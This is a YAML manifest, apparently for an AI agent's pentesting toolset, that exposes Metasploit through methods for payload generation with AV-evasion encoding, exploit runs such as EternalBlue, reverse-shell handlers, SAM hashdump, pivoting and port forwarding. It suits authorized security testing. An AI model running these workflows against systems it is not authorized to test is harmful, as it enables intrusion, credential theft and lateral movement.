name: metasploit
version: "6.4"
description: "Metasploit Framework v6.4 with persistent sessions via msfrpcd (RPC daemon) and the workspace database (PostgreSQL + msfdb auto-initialized at container start). 29 methods covering ~80–90% of msfconsole. Module surface: generate_payload, search_modules, module_info, check_vuln, run_exploit, exec_command, post_module, handler. Session surface: list_sessions, session_command, session_kill, session_upgrade. Job surface: list_jobs, stop_job. Pivoting: route_add/list/delete, portfwd_add/list/delete (executed through the meterpreter session API, not the shared console — Win7 SP1 verified live). Database surface: db_nmap, db_import, list_hosts, list_services, list_creds, list_loot, list_notes. Escape hatches: run_console (one msfconsole command) and run_resource_script (multi-line .rc script content). Sessions and jobs persist in msfrpcd between MCP calls. Container runs in service mode — single msfrpcd kept warm. All console/meterpreter operations are serialized through a server-side lock so concurrent agent calls don't trip over each other."
image: "ghcr.io/silicon-works/mcp-tools-metasploit:latest"
image_size_mb: 3000
timeout_seconds: 600

service: true
service_name: "metasploit"

capabilities:
  - payload_generation
  - exploit_execution
  - vulnerability_checking
  - module_search
  - session_management
  - credential_extraction
  - lateral_movement
  - network_pivoting
  - port_forwarding
  - workspace_database
  - post_exploitation
  - shell_to_meterpreter_upgrade

phases:
  - enumeration       # auxiliary/scanner/* modules (smb_version, ftp_anonymous, etc.)
  - exploitation      # primary use case
  - post-exploitation # session_command, post_module, hashdump, pivoting

requirements:
  network: true
  privileged: false

resources:
  memory_mb: 2048
  cpu: 1.0

# Routing hints for tool selection. Triggers are REGEX patterns matched
# against the agent's query (regex match → +35 score, the largest single
# bonus). Use_for is substring-matched (+8). Phase match adds +0.15
# multiplicative bonus when the agent's task phase matches our phases.
routing:
  use_for:
    - "run Metasploit exploit module against a target"
    - "generate msfvenom payloads for reverse shells or meterpreter"
    - "check if target is vulnerable with Metasploit scanner module"
    - "manage meterpreter or shell sessions on exploited targets"
    - "run post-exploitation modules for credential gathering"
    - "set up multi/handler to catch reverse shell connections"
    - "search for Metasploit modules by CVE or service name"
    - "execute commands through exploit without full session"
    - "pivot through a compromised host into an internal network"
    - "set up port forwarding through a meterpreter session"
    - "upgrade a shell session to meterpreter"
    - "import nmap/nessus scan results into the metasploit workspace database"
    - "dump SAM hashes from a compromised Windows host"
    - "list active metasploit sessions, jobs, hosts, services, credentials, or loot"
    - "run a multi-line msfconsole resource script for repeatable workflows"
    - "execute arbitrary msfconsole commands when no named method covers the task"
  never_use_for:
    - task: "port scanning networks (use the standalone nmap tool)"
      use_instead: "nmap"
      reason: "metasploit's db_nmap exists but is for keeping msf workspace state in sync — for primary scans nmap is better"
    - task: "directory enumeration / web fuzzing (use ffuf or feroxbuster)"
      use_instead: "ffuf"
    - task: "SQL injection (use sqlmap)"
      use_instead: "sqlmap"
    - task: "password brute force (use hydra)"
      use_instead: "hydra"
  # Triggers are matched as case-insensitive regex. Plain substrings work
  # for most cases (case-insensitive substring match is automatic via the
  # `i` flag). Use single-quotes to avoid yaml's double-quote escape rules.
  triggers:
    # Direct tool/component names — plain substrings
    - metasploit
    - msfconsole
    - msfvenom
    - msfrpcd
    - meterpreter
    - 'multi/handler'
    # Module taxonomy
    - 'exploit module'
    - 'exploit framework'
    - 'auxiliary module'
    - 'auxiliary scanner'
    - 'post module'
    - 'post-exploitation'
    - 'post exploitation'
    # Payload concepts
    - 'reverse shell'
    - 'bind shell'
    - reverse_tcp
    - reverse_https
    - bind_tcp
    # CVE / advisory regex (matches MS17-010, MS08-067, etc.)
    - 'MS\d{2}-\d{3}'
    # Well-known exploit names
    - EternalBlue
    - EternalRomance
    - BlueKeep
    - ZeroLogon
    - PrintNightmare
    - 'samba.*usermap'
    - 'vsftpd.*backdoor'
    # Pivoting concepts
    - portfwd
    - 'port forward'
    - 'port forwarding'
    # Credential extraction concepts
    - hashdump
    - kiwi
    - mimikatz
  prefer_over: []

methods:
  generate_payload:
    description: "Generate a payload using msfvenom. Supports all Metasploit payloads (staged/stageless, meterpreter/shell) in multiple output formats (exe, elf, raw, python, php, asp, c, dll). Optional encoding with x86/shikata_ga_nai or other encoders for AV evasion. Returns the payload as base64."
    when_to_use: "When you need a compiled payload binary for delivery to a target. Common payloads: 'windows/meterpreter/reverse_tcp' (staged Windows meterpreter), 'linux/x64/shell_reverse_tcp' (stageless Linux reverse shell), 'php/meterpreter/reverse_tcp' (PHP web shell). After generating, use handler to start a listener, then deliver the payload to the target. For simple text-based reverse shells (bash, python one-liners), use payload tool's revshell or exploit-runner's generate_payload instead."
    params:
      payload:
        type: string
        required: true
        description: "Payload name (e.g., 'windows/meterpreter/reverse_tcp') or shortcut"
      lhost:
        type: string
        required: true
        description: "Listening host IP for reverse connections"
      lport:
        type: integer
        required: true
        description: "Listening port for reverse connections"
      format:
        type: string
        default: "raw"
        description: "Output format: exe, elf, raw, python, php, asp, c, dll, etc."
      encoder:
        type: string
        description: "Encoder to use (e.g., 'x86/shikata_ga_nai')"
      iterations:
        type: integer
        default: 1
        description: "Number of encoding iterations"
    returns:
      payload_base64:
        type: string
        description: "Base64 encoded payload"
      size_bytes:
        type: integer
        description: "Payload size in bytes"

  search_modules:
    description: "Search for Metasploit modules via the structured module.search RPC. Returns typed records (no console parsing)."
    when_to_use: "To find exploits or auxiliary modules for a specific vulnerability or service"
    params:
      query:
        type: string
        required: true
        description: "Search query (e.g., 'ms17-010', 'apache struts', 'smb')"
      type:
        type: enum
        values: [all, exploit, auxiliary, post, payload]
        default: all
        description: "Module type to search for"
      limit:
        type: integer
        default: 100
        description: "Max results (1-1000)"
      offset:
        type: integer
        default: 0
        description: "Pagination offset"
    returns:
      modules:
        type: array
        description: "Matching modules — each record has type, name, fullname, rank, disclosure_date, check"
      count:
        type: integer
        description: "Number of records on this page"
      total_items:
        type: integer
        description: "Total matches before pagination"

  check_vuln:
    description: "Check if a target is vulnerable using an auxiliary scanner module"
    when_to_use: "To verify if a target is vulnerable before attempting exploitation"
    params:
      module:
        type: string
        required: true
        description: "Auxiliary module path (e.g., 'auxiliary/scanner/smb/smb_ms17_010')"
      rhosts:
        type: string
        required: true
        description: "Target host(s)"
      options:
        type: object
        description: "Additional module options as key-value pairs"
      timeout:
        type: integer
        default: 120
        description: "Timeout in seconds"
    returns:
      vulnerable:
        type: boolean
        description: "Whether target appears vulnerable"

  run_exploit:
    description: "Run an exploit module via the structured module.execute RPC. Sets RHOSTS / payload / LHOST / LPORT and any additional options through the module object's runopts, then queues the exploit as a background job. Polls sessions.list (NOT console output) until a new session appears or session_wait_seconds elapses. Returns the structured session set, plus job_id/uuid from the RPC. Bad option names raise ValidationError upfront. Bad payload-target combos are rejected by the RPC's compatibility check before submission."
    when_to_use: "To exploit a confirmed vulnerability with a Metasploit module. Always run check_vuln first when available. Common exploit workflow: search_modules('ms17-010') → check_vuln with the auxiliary module → run_exploit with the exploit module. Provide lhost/lport for reverse payloads. Sessions opened by successful exploits persist in msfrpcd and can be accessed later via session_command."
    params:
      module:
        type: string
        required: true
        description: "Exploit module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')"
      rhosts:
        type: string
        required: true
        description: "Target host(s)"
      payload:
        type: string
        description: "Payload to use"
      lhost:
        type: string
        description: "Listening host for reverse payloads"
      lport:
        type: integer
        description: "Listening port for reverse payloads"
      options:
        type: object
        description: "Additional module options"
      timeout:
        type: integer
        default: 300
        description: "Timeout in seconds"
      disable_payload_handler:
        type: boolean
        default: false
        description: "If true, sets DisablePayloadHandler=true so the exploit does NOT start its own implicit handler. Use this when you've already started a separate handler() for the same payload — otherwise the exploit's internal handler tries to bind the same LPORT and fails with 'Handler failed to bind'."
      session_wait_seconds:
        type: integer
        default: 30
        description: "How long to poll for new sessions after exploit submission. Async exploits (typical for reverse-payload modules) can take 30-60+ seconds to actually create a session; the `exploit -j` console output returns synchronously when the JOB is queued, not when the exploit completes (May 2026 fix — was previously reporting success too early)."
    returns:
      exploit_success:
        type: boolean
        description: "True iff a new session appeared during the poll window. No console string-matching — purely a delta on sessions.list."
      sessions:
        type: array
        description: "New sessions opened (id, type, info, via_exploit, tunnel_peer)"
      session_count:
        type: integer
        description: "Number of new sessions opened"
      job_id:
        type: integer
        description: "Background job id returned by module.execute RPC"
      uuid:
        type: string
        description: "Module run uuid returned by module.execute RPC"

  exec_command:
    description: "Execute a command on target using an exploit with cmd/unix/generic payload"
    when_to_use: "For command execution exploits without needing a full session"
    params:
      module:
        type: string
        required: true
        description: "Exploit module path that supports command execution"
      rhosts:
        type: string
        required: true
        description: "Target host(s)"
      command:
        type: string
        required: true
        description: "Command to execute on the target"
      options:
        type: object
        description: "Additional module options (e.g., RPORT, TARGETURI)"
      timeout:
        type: integer
        default: 120
        description: "Timeout in seconds"
    returns:
      exploit_success:
        type: boolean
        description: "Whether exploit succeeded"
      command_output:
        type: string
        description: "Output from executed command"

  list_sessions:
    description: "List active Meterpreter/shell sessions"
    when_to_use: "To check for established sessions from previous exploits"
    params:
      timeout:
        type: integer
        default: 30
        description: "Timeout in seconds"
      limit:
        type: integer
        default: 100
      offset:
        type: integer
        default: 0
    returns:
      sessions:
        type: array
        description: "Active sessions with id, type, info, tunnel_local, tunnel_peer, via_exploit, via_payload, platform, arch"
      count:
        type: integer
        description: "Number of session records on this page"
      total_items:
        type: integer

  session_command:
    description: "Run a command in an active session"
    when_to_use: "To execute commands in an established Meterpreter/shell session"
    params:
      session_id:
        type: integer
        required: true
        description: "Session ID to interact with"
      command:
        type: string
        required: true
        description: "Command to execute in the session"
      timeout:
        type: integer
        default: 60
        description: "Timeout in seconds"
    returns:
      session_id:
        type: integer
        description: "Session ID used"
      command:
        type: string
        description: "Command executed"
      output:
        type: string
        description: "Output from the command"

  post_module:
    description: "Run a post-exploitation module on a session via msfrpcd console. KNOWN LIMITATION: post modules that call create_credential (post/windows/gather/hashdump, smart_hashdump, post/multi/gather/credentials/*, mimikatz_dynwrapx) trigger an ActiveRecord 'Session can't be blank' error during DB write — verified live on Blue, Win7 SP1, meterpreter session — and halt before hashes reach the agent. Workaround: for credential extraction, call session_command(session_id, 'hashdump') instead — runs hashdump as a meterpreter built-in, no DB write, returns full SAM dump. Non-credential modules (enum_logged_on_users, enum_shares, gather/checkvm, gather/dumplinks, recon/*) work fine through this path."
    when_to_use: "For post-exploitation tasks (enum_logged_on_users, enum_shares, dumplinks). For credential extraction (hashdump, smart_hashdump, etc.) prefer session_command with the meterpreter built-in equivalent — see description for the AR/DB limitation."
    params:
      module:
        type: string
        required: true
        description: "Post module path (e.g., 'post/multi/gather/env', 'post/windows/gather/enum_logged_on_users')"
      session_id:
        type: integer
        required: true
        description: "Session ID to run the module on"
      options:
        type: object
        description: "Additional module options"
      timeout:
        type: integer
        default: 120
        description: "Timeout in seconds"
    returns:
      module:
        type: string
        description: "Module executed"
      session_id:
        type: integer
        description: "Session ID used"

  handler:
    description: "Start a multi/handler to catch reverse shells. Handler runs as a background job in msfrpcd; persists across MCP calls until manually stopped or container restart."
    when_to_use: "To set up a persistent listener for reverse shell payloads. Always START the handler BEFORE delivering the payload — otherwise the callback fails with no listener. For multiple expected sessions (mass payload delivery), keep exit_on_session=false (default). For single-shot exploitation, set exit_on_session=true so the handler self-cleans after first connect."
    params:
      payload:
        type: string
        required: true
        description: "Payload to listen for (e.g., 'windows_reverse_tcp' shortcut or 'windows/x64/meterpreter/reverse_tcp' full)"
      lhost:
        type: string
        required: true
        description: "Listening host IP — your attacker IP (typically tun0)"
      lport:
        type: integer
        required: true
        description: "Listening port — must match LPORT in the payload you delivered"
      timeout:
        type: integer
        default: 300
        description: "Timeout waiting for connection (seconds)"
      exit_on_session:
        type: boolean
        default: false
        description: "If true, handler EXITS after first session connects (single-shot). If false (default), handler stays running for multiple sessions. Maps directly to msfconsole's ExitOnSession option."
    returns:
      payload:
        type: string
        description: "Payload type (resolved if shortcut)"
      lhost:
        type: string
        description: "Listening host"
      lport:
        type: integer
        description: "Listening port"
      handler_started:
        type: boolean
        description: "True if msfrpcd registered the job in jobs.list (post-call verified) OR fallback markers in raw output indicate a successful bind"
      job_id:
        type: string
        description: "Background job ID extracted from console output ('Exploit running as background job N')"
      registered_job:
        type: object
        description: "The jobs.list entry for this handler (set when verified via the post-call poll)"

  # ── May 2026 expansion (Wave 2-5): job/session/route/portfwd/db/escape ──

  list_jobs:
    description: "List active background jobs (handlers, listeners, exploit -j submissions). Maps to msfconsole `jobs -l`."
    when_to_use: "After starting handlers or running exploits, to enumerate active jobs. Use stop_job to clean up."
    params:
      limit:
        type: integer
        default: 100
      offset:
        type: integer
        default: 0
    returns:
      jobs:
        type: array
        description: "Active jobs (id, name, ...)"
      count:
        type: integer
        description: "Number of job records on this page"
      total_items:
        type: integer

  stop_job:
    description: "Stop a background job. Maps to msfconsole `jobs -k <id>` or `jobs -K`. Returns `stopped` boolean — verified post-call by polling jobs.list."
    when_to_use: "After a handler is no longer needed, or to clean up before starting a new one on the same LPORT (avoids 'Handler failed to bind' from port collision)."
    params:
      job_id:
        type: integer
        description: "Specific job ID to stop (from list_jobs)"
      all_jobs:
        type: boolean
        default: false
        description: "If true, stop all running jobs (jobs -K)"
    returns:
      stopped_job_id:
        type: integer
        description: "Job ID that was stopped (set when job_id was passed)"
      stopped:
        type: boolean
        description: "True if the specific job is no longer in jobs.list after the kill"
      stopped_all:
        type: boolean
        description: "True when all_jobs=True was passed"
      remaining_jobs:
        type: integer
        description: "Number of jobs still listed after `jobs -K` (0 means all stopped)"

  session_kill:
    description: "Kill a session. Maps to msfconsole `sessions -k <id>` or `sessions -K`. Returns `killed` boolean — verified by polling sessions.list (msfrpcd's session reap is async, can take ~1s after the kill command returns)."
    when_to_use: "When a session is stale or done. Important for engagement hygiene — leaving stale meterpreter sessions can confuse later operations."
    params:
      session_id:
        type: integer
        description: "Specific session ID to kill (from list_sessions)"
      all_sessions:
        type: boolean
        default: false
        description: "If true, kill all sessions (sessions -K)"
    returns:
      session_id:
        type: integer
      all_sessions:
        type: boolean
      killed:
        type: boolean
        description: "True if session is no longer in sessions.list after up to 3s of polling"

  session_upgrade:
    description: "Upgrade a shell session to meterpreter. Maps to msfconsole `sessions -u <id>` (runs post/multi/manage/shell_to_meterpreter under the hood). Critical workflow — most exploits return shells; many post modules need meterpreter. Polls up to 30s for the new session and probes it with `getuid` to confirm responsiveness so the agent doesn't get a zombie meterpreter ID."
    when_to_use: "When you have a shell session but need meterpreter capabilities (most post/windows/gather/* modules require meterpreter). Returns the NEW meterpreter session ID after polling + probing."
    params:
      session_id:
        type: integer
        required: true
        description: "Existing shell session ID to upgrade"
      lhost:
        type: string
        description: "Listening host for the new meterpreter callback (defaults to msf's setg LHOST)"
      lport:
        type: integer
        description: "Listening port for the new meterpreter callback"
      timeout:
        type: integer
        default: 180
        description: "How long to wait for the upgrade + new meterpreter session to appear"
    returns:
      shell_session_id:
        type: integer
        description: "Original shell session ID"
      meterpreter_session_id:
        type: integer
        description: "New meterpreter session ID (null if upgrade failed)"
      upgrade_success:
        type: boolean
        description: "True if a new meterpreter session appeared in sessions.list"
      session_responsive:
        type: boolean
        description: "True if `getuid` against the new session returned non-empty output (proves the channel is live, not just registered)"

  module_info:
    description: "Return structured module metadata via the module.info + module.options RPCs — name, description, rank, references, targets, options (with required/default/desc/enums per option). No console parsing. A bad module path is rejected upfront with ValidationError instead of silently falling back to the previous module's info."
    when_to_use: "Before run_exploit / check_vuln / post_module, to discover what options the module accepts (RHOSTS, SMBUser, TARGET, etc.). Avoids agent trial-and-error on option names."
    params:
      module:
        type: string
        required: true
        description: "Module path including type prefix (e.g., 'exploit/windows/smb/ms17_010_eternalblue')"
    returns:
      module:
        type: string
      type:
        type: string
        description: "exploit / auxiliary / post / payload / encoder / nop / evasion"
      name:
        type: string
      description:
        type: string
      rank:
        type: string
      references:
        type: array
      targets:
        type: array
      options:
        type: object
        description: "Map of option name → {type, required, advanced, evasion, default, desc, enums}"
      required_options:
        type: array
        description: "List of option names that are required to run the module"

  route_add:
    description: "Add a route through a session for pivoting into a network reachable by the compromised host. Maps to msfconsole `route add <subnet> <netmask> <session>`. Returns route_added boolean — verified by re-querying route print after — so the agent doesn't need to interpret msfconsole's cosmetic 'Invalid :session' warning."
    when_to_use: "When you've compromised a host with access to an internal network you want to scan/exploit further. Subsequent metasploit modules that target IPs in this subnet automatically route through the session."
    params:
      subnet:
        type: string
        required: true
        description: "Subnet to route (e.g., '10.10.20.0')"
      netmask:
        type: string
        required: true
        description: "Netmask (e.g., '255.255.255.0' or '/24')"
      session_id:
        type: integer
        required: true
        description: "Session ID to route through"
    returns:
      route_added:
        type: boolean
        description: "True if route appears in route print after the add (post-call verification)"

  route_list:
    description: "List active routes. Returns parsed route rows + raw output. Maps to msfconsole `route print`."
    when_to_use: "After route_add, to confirm. Or to check routing state mid-engagement."
    params: {}
    returns:
      routes:
        type: array
        description: "Parsed route rows (Subnet, Netmask, Gateway)"
      count:
        type: integer

  route_delete:
    description: "Delete a route. Maps to msfconsole `route remove <subnet> <netmask> <session_id>`. session_id is REQUIRED in msfconsole 6.4 (passing only subnet+netmask returns 'Missing arguments'). Returns route_removed boolean — verified by re-querying route print so the agent doesn't need to interpret msfconsole's cosmetic 'Invalid :session' warning."
    when_to_use: "When the underlying session is gone or you want to redirect traffic differently."
    params:
      subnet:
        type: string
        required: true
        description: "Subnet to delete (e.g., '10.129.200.0')"
      netmask:
        type: string
        required: true
        description: "Netmask (e.g., '255.255.255.0')"
      session_id:
        type: integer
        required: true
        description: "Meterpreter session ID the route was bound to. Required by msfconsole 6.4."
    returns:
      route_removed:
        type: boolean
        description: "True if subnet no longer appears in route print after the remove (post-call verification)"

  portfwd_add:
    description: "Set up local-to-remote port forwarding through a meterpreter session. Maps to meterpreter `portfwd add -l <local> -p <remote_port> -r <remote_host>`. Local-bind on attacker, traffic proxied through session to remote_host:remote_port. Useful for using non-msf tools (impacket, ssh, curl) against pivoted internal hosts."
    when_to_use: "When you need to access a service on an internal host from your attacker box (where direct routing isn't enough — e.g., you want to use impacket-secretsdump from outside the meterpreter session). After portfwd_add, connect to localhost:local_port from your attacker tools."
    params:
      session_id:
        type: integer
        required: true
        description: "Meterpreter session ID (must be a meterpreter, not a shell)"
      local_port:
        type: integer
        required: true
        description: "Local port on attacker side that will forward"
      remote_host:
        type: string
        required: true
        description: "Remote host reachable from the meterpreter session"
      remote_port:
        type: integer
        required: true
        description: "Remote port on remote_host"

  portfwd_list:
    description: "List active port forwards in a meterpreter session. Returns parsed forward rows + raw output. Maps to meterpreter `portfwd list`."
    params:
      session_id:
        type: integer
        required: true
    returns:
      forwards:
        type: array
        description: "Parsed forward rows (Index, Local, Remote, Direction)"
      count:
        type: integer

  portfwd_delete:
    description: "Delete a port forward. Maps to meterpreter `portfwd delete -l <local>`."
    params:
      session_id:
        type: integer
        required: true
      local_port:
        type: integer
        required: true

  db_nmap:
    description: "Run nmap inside msfconsole — scan results auto-import into the workspace database. Maps to msfconsole `db_nmap <args>`. Requires DB-enabled msfrpcd (entrypoint enables postgres + msfdb init since May 2026)."
    when_to_use: "Bridge between enum phase and msf state. Output is regular nmap output PLUS hosts/services get added to the workspace DB so subsequent metasploit modules see them via list_hosts / list_services. For external nmap usage prefer the standalone nmap kind:cli tool — db_nmap is for keeping msf's view in sync."
    params:
      args:
        type: string
        required: true
        description: "nmap command-line arguments. Example: '-sV -p 22,80,445 10.10.10.40'"
      timeout:
        type: integer
        default: 600
        description: "Timeout in seconds (large scans can take a while)"

  db_import:
    description: "Import scan data from a file (nmap XML, nessus, openvas, etc.) into the workspace DB. Maps to msfconsole `db_import <path>`. Requires DB-enabled msfrpcd."
    when_to_use: "After running an external scanner whose output you want to bring into msf's workspace state. Common: import nmap XML produced by the standalone nmap kind:cli tool."
    params:
      file_path:
        type: string
        required: true
        description: "Path to scan file inside the container (use /session/output/<file> for files written from outside)"

  list_hosts:
    description: "List hosts via the structured db.hosts RPC. Records come back already-typed (address, mac, name, os_name, os_flavor, os_sp, purpose, info, comments). Populated by run_exploit, db_import, db_nmap."
    when_to_use: "Query workspace state — what hosts has msf seen during this engagement. Useful before pivoting decisions."
    params:
      address:
        type: string
        description: "Filter to a specific address"
      limit:
        type: integer
        default: 100
        description: "Max results (1-1000)"
      offset:
        type: integer
        default: 0
        description: "Pagination offset"
    returns:
      hosts:
        type: array
        description: "Host records on this page"
      count:
        type: integer
      total_items:
        type: integer

  list_services:
    description: "List services via the structured db.services RPC. Records come back already-typed (host, port, proto, name, state, info). Populated by db_nmap, auxiliary scanners."
    when_to_use: "Query discovered services — what's open and what version on each host."
    params:
      host:
        type: string
        description: "Filter to a specific host address"
      port:
        type: integer
        description: "Filter to a specific port"
      limit:
        type: integer
        default: 100
      offset:
        type: integer
        default: 0
    returns:
      services:
        type: array
        description: "Service records on this page"
      count:
        type: integer
      total_items:
        type: integer

  list_creds:
    description: "List credentials via the structured db.creds RPC. Records come back already-typed (host, origin, service, public, private, realm, private_type, JtR Format, cracked_password). Populated by post hashdump, login_check, etc."
    when_to_use: "Query gathered credentials. After hashdump, the SAM hashes are added to creds; after smb_login auxiliary, valid creds are added."
    params:
      host:
        type: string
        description: "Filter to a specific host"
      limit:
        type: integer
        default: 100
      offset:
        type: integer
        default: 0
    returns:
      creds:
        type: array
      count:
        type: integer
      total_items:
        type: integer

  list_loot:
    description: "List loot via the structured db.loots RPC — gathered files like SAM hashes, configs, screenshots."
    when_to_use: "After post modules that gather data (hashdump, screenshot, get_loggedon_info, etc.). loot tracks the actual file paths."
    params:
      limit:
        type: integer
        default: 100
      offset:
        type: integer
        default: 0
    returns:
      loot:
        type: array
        description: "Loot records (host, service, type, name, content, info, path)"
      count:
        type: integer
      total_items:
        type: integer

  list_notes:
    description: "List engagement notes via the structured db.notes RPC."
    when_to_use: "Query notes added by various modules during the engagement (smb_version notes, ms17_010 vulnerable notes, etc.)."
    params:
      limit:
        type: integer
        default: 100
      offset:
        type: integer
        default: 0
    returns:
      notes:
        type: array
        description: "Note records (Time, Host, Service, Port, Protocol, Type, Data)"
      count:
        type: integer
      total_items:
        type: integer

  run_resource_script:
    description: "Execute a sequence of msfconsole commands as a resource script. Maps to msfconsole `resource <file.rc>` but accepts inline content. Useful for repeatable workflows or chained commands the named methods don't cover cleanly."
    when_to_use: "When you want to encode a multi-step workflow as a single tool call. Example: 'use exploit/...; set RHOSTS ...; set PAYLOAD ...; exploit'. For one-shot exploits prefer run_exploit; this is for atypical multi-command sequences."
    params:
      commands:
        type: string
        required: true
        description: "Multi-line msfconsole commands (one per line) to execute in sequence"
      timeout:
        type: integer
        default: 600

  run_console:
    description: "Generic msfconsole command escape hatch — execute arbitrary msfconsole input and return raw output. Use sparingly; prefer the structured named methods when they fit. Useful for niche show variants, plugin commands, debugging, or workflows that don't cleanly map to any named method. Equivalent of the 'recipe' pattern for kind:cli tools — generic surface for the niche cases."
    when_to_use: "ONLY when no named method covers the operation. Examples: 'show advanced' for a module, plugin-specific commands, msfconsole debugging. Most workflows should use the named methods (run_exploit, session_command, post_module, etc.) which give structured returns."
    params:
      command:
        type: string
        required: true
        description: "msfconsole command (single line or multi-line)"
      timeout:
        type: integer
        default: 60

# ── Failure signatures ────────────────────────────────────────────────────
# Ported from _classify_msf_error() in mcp-server.py (May 2026). The Python
# classifier remains the runtime authority; these signatures duplicate it for
# tool.yaml-driven plugin-side scanning (Investigation B). Substring match by
# default. _classify_msf_error lowercases output before matching, but msf
# typically prints in original case — keep signatures original-case here.
failure_signatures:
  - signal: "timed out"
    error_class: timeout
    remediation: "Target unreachable or link is slow. Check host with nmap; if reachable, increase the per-call timeout. Common with msfconsole running an exploit that waits for a service response."

  - signal: "unreachable"
    error_class: network_unreachable
    remediation: "Target host or network unreachable. Check VPN (tun0 up), firewall, target alive (ping/nmap)."

  - signal: "Connection refused"
    error_class: network_unreachable
    remediation: "Target port closed or service not running. Verify with nmap -p<port> <target>; metasploit modules typically expect specific service ports."

  - signal: "ConnectionRefused"
    error_class: network_unreachable
    remediation: "Same as 'Connection refused' — different msf module spelling."

  - signal: "Unknown datastore option"
    error_class: invalid_parameter
    remediation: "Module option name misspelled or doesn't exist on this module. Use search_modules to find the right module path; msfconsole's `info <module>` shows valid options. Common cause: passing 'TARGET' to an exploit that uses 'RHOSTS'."

  - signal: "Module not found"
    error_class: tool_misconfigured
    remediation: "Module path doesn't exist in this msfrpcd's module set. Use search_modules to verify the path. Common cause: typo in 'exploit/windows/...' (missing or extra slash)."

  - signal: "Failed to load"
    error_class: tool_misconfigured
    remediation: "Module exists but failed to load. Could be Ruby syntax error in the module, missing dependency, or module disabled. Try `reload_all` in console; if persistent, the module is broken — file a bug or use a different module."

  - signal: "Handler failed to bind"
    error_class: invalid_parameter
    remediation: "LPORT already in use by another handler or process on the container. Choose a different LPORT (each handler needs its own port), or stop the previous handler with `jobs -K`."

  - signal: "Address is already in use"
    error_class: invalid_parameter
    remediation: "Same as 'Handler failed to bind' — port conflict. Use list_sessions / `jobs -l` to find what's listening; kill it or pick a different LPORT."

  # session lifecycle errors — match any of: not found / dead / closed
  - signal: "session.* not found"
    pattern_type: regex
    error_class: session_lost
    remediation: "Referenced session no longer exists. Use list_sessions to enumerate active sessions. The session may have died (target crashed, network broken, target rebooted) — re-exploit if needed."

  - signal: "session.* dead"
    pattern_type: regex
    error_class: session_lost
    remediation: "Session marked dead by msfrpcd (target lost connection). Use list_sessions; re-exploit if you need a fresh session."

  - signal: "session.* closed"
    pattern_type: regex
    error_class: session_lost
    remediation: "Session closed (deliberately or due to target). Use list_sessions to confirm; re-exploit if needed."

# ── Gotchas ───────────────────────────────────────────────────────────────
gotchas:
  - "metasploit exposes EXACTLY 29 methods listed under `methods:` (plus run_cli and verify_clock auto-registered by the framework). For arbitrary msfconsole input there are TWO escape hatches: run_console (single msfconsole command, returns raw output) and run_resource_script (multi-line .rc script content). Prefer the named methods (run_exploit, post_module, route_add, portfwd_add, db_nmap, etc.) when they fit — they return structured fields the agent can branch on; fall back to run_console / run_resource_script only when no named method covers the operation."

  - "Payload SHORTCUTS auto-resolve to full names: windows_reverse_tcp → windows/meterpreter/reverse_tcp, windows_reverse_https → windows/meterpreter/reverse_https, linux_reverse_tcp → linux/x64/meterpreter/reverse_tcp, linux_shell_tcp → linux/x64/shell_reverse_tcp, php_reverse → php/meterpreter/reverse_tcp, java_reverse → java/meterpreter/reverse_tcp. Pass either the shortcut or the full name."

  - "PAYLOAD_FORMATS supported by generate_payload: exe, elf, raw, ruby, python, perl, php, asp, aspx, jsp, war, ps1, psh, vba, c, dll, msi. Any other value is passed through to msfvenom which may fail with 'Invalid format'."

  - "First call to metasploit may take up to 120s — msfrpcd cold-start loads ~2300 modules. Subsequent calls are fast (~3s). The MCP server retries connection 30× over 60s before giving up; if the first call fails with 'connection refused' to msfrpcd, wait ~30s and retry."

  - "Sessions persist in msfrpcd memory across MCP calls. session_command, list_sessions, and post_module reach the same session set. Sessions DIE if: target meterpreter process exits, network breaks, target reboots, or msfrpcd restarts. ContainerManager keeps msfrpcd warm via service:true — sessions survive between MCP calls within the same engagement."

  - "MSF_PASSWORD: per-engagement randomized at container start (May 2026). Override with MSF_PASSWORD env var if you need a deterministic password (e.g., for debugging by attaching msfconsole manually). Defense-in-depth — only matters if container is exposed beyond loopback (host network mode does NOT expose 55553 by default)."

  - "post_module requires SESSION param matching an existing session ID from list_sessions. Most post modules need a METERPRETER session (not a raw shell). Convert with `sessions -u <id>` via session_command, or re-exploit with a meterpreter payload."

  - "handler runs as a JOB (background). The job persists in msfrpcd until manually stopped (`jobs -K`) or container restart. Multiple handlers on different LPORTs work fine; same LPORT will fail with 'Handler failed to bind'. Use exit_on_session=true if you want the handler to self-clean after first session."

  - "exec_command (one-shot via exploit) is for cases where you don't need a session — useful for command-injection exploits where the goal is just to RUN something. Returns command output, no session created. Use run_exploit when you DO need a session for follow-up."

  - "The shared msfconsole (_console_exec) is single-threaded. Concurrent calls get serialized. For high-throughput operations (mass payload generation, batch module loading), prefer one console invocation with multiple commands over many sequential calls."

  - "Method handler() (registered as `handler`, Python method renamed from start_handler() in May 2026): accepts exit_on_session boolean. Default false = handler stays running for multiple sessions. Set true for single-shot exploitation. Pre-fix this kwarg was silently dropped — agent's intent was lost."

  - "run_exploit (May 2026): success now confirmed by polling sessions.list during session_wait_seconds (default 30s) — no longer trusts the misleading 'Exploit completed, but no session was created' / 'exploit completed' phrases that msf prints before the second-stage handler binds. If the exploit window is short, raise session_wait_seconds. If you have an external handler running on the same LPORT, set disable_payload_handler=true to avoid the bind collision."

  - "check_vuln (May 2026): uses `check` for exploit modules and `run` for auxiliary modules. Earlier versions sent `run` for everything which actually FIRED the exploit on exploit/* modules — verified live: ms17_010_eternalblue's check phase completed and rolled into the exploit phase, leaving Blue with a half-exploited buffer until the timeout. Always pass an exploit/* or auxiliary/* module path; module paths without that prefix default to `check`."

  - "portfwd_add / portfwd_list / portfwd_delete bypass the shared msfconsole and call the meterpreter session's `run_with_output` directly. msfconsole's `sessions -i N -c \"portfwd ...\"` dispatches the command string through stdapi_sys_process_execute on Windows targets — verified live on Blue, Win7 SP1: every portfwd attempt errored with 'The system cannot find the file specified' before the fix. The direct API reaches the meterpreter built-in command parser correctly."

  - "route_delete (May 2026) requires session_id in msfconsole 6.4 — `route remove <subnet> <netmask>` returns 'Missing arguments to route remove'; `route remove <subnet> <netmask> <sid>` succeeds. The keyword is `remove` (not `delete`); `delete` falls through to the usage banner with exit 0, leaving the route in place. msfconsole emits a cosmetic '[-] Invalid :session, expected Session object got Msf::Sessions::Meterpreter_x64_Win' warning during route_add/delete — the operation still succeeds; trust route_list as ground truth."

